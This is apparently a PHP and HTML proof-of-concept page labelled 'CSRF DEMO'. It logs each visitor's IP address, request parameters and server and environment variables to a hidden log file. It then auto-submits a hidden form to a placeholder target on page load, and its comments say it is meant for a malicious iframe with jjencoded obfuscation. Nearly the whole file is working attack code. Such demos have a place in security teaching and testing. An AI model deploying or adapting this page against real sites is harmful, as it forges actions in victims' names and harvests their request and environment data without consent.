<?php

# grab IP
$src_ip = $_SERVER[REMOTE_ADDR];

# LOGGING
$file = '65ec148faeaced7bf7a9dfd62da82ce4.log';
$data = "New client: $src_ip! Time is " . date(DATE_RFC822) . "\n";
$data .= print_r($_GET, true);
$data .= print_r($_POST, true);
$data .= print_r($_REQUEST, true);
$data .= print_r($_ENV, true);
$data .= print_r($_SERVER, true);
file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

# the below goes inside malicious iframe
# jjencode the javascript for obfuscation
?>
<HTML>
<HEAD>
<TITLE>CSRF DEMO</TITLE>
</HEAD>
<script language="javascript" type="text/javascript"> 
var ip = "<?= $src_ip ?>";
</script>
<script language="javascript" type="text/javascript"> 
var form = document.createElement("form");
form.setAttribute("method", 'POST');
// devel
//form.setAttribute("action", 'dump.php');
form.setAttribute("action", '<target>');

var params= new Array()

params["first_name"] = ip;
params["last_name"] = "CSRF ATTACK/VICTIM";
params["email"] = ":P@" + ip;

for(var key in params) 
{
    var hiddenField = document.createElement("input");
    hiddenField.setAttribute("type", "hidden");
    hiddenField.setAttribute("name", key);
    hiddenField.setAttribute("value", params[key]);

    form.appendChild(hiddenField);
}

form.submit();
</script>
<BODY>
</BODY>
</HTML>
